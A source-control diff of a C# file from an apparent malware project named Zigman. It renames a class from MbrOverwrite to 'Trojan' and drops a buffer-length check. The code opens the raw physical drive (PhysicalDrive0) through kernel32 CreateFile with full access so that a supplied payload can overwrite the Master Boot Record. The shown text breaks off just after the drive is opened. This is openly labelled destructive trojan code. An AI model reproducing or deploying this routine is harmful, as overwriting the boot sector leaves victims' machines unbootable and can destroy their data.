@@ -1,11 +1,16 @@
-﻿using System.Runtime.InteropServices;
+﻿// Copyright © TheAirBlow 2022 <theairblow.help@gmail.com>
+// This Source Code Form is subject to the terms of the Mozilla Public
+// License, v2.0. If a copy of the MPL was not distributed with this
+// file, You can obtain one at http://mozilla.org/MPL/2.0/.
 
-namespace Zigman.Engine;
+using System.Runtime.InteropServices;
+
+namespace Zigman.Engine.Legacy;
 
 /// <summary>
 /// Overwrite MBR
 /// </summary>
-public class MbrOverwrite
+public partial class Trojan
 {
     [DllImport("kernel32")]
     private static extern IntPtr CreateFile(
@@ -26,14 +31,11 @@ public class MbrOverwrite
         IntPtr lpOverlapped);
 
     /// <summary>
-    /// Overwrite MBN
+    /// Overwrite MBR
     /// </summary>
     /// <param name="buffer">MBR payload</param>
-    /// <exception cref="Exception">Buffer length is not 512</exception>
     public static void Overwrite(byte[] buffer)
     {
-        if (buffer.Length != 512)
-            throw new Exception("Buffer length is not 512!");
         var mbr = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 
             0x1 | 0x2, IntPtr.Zero, 
             0x3, 0, IntPtr.Zero);
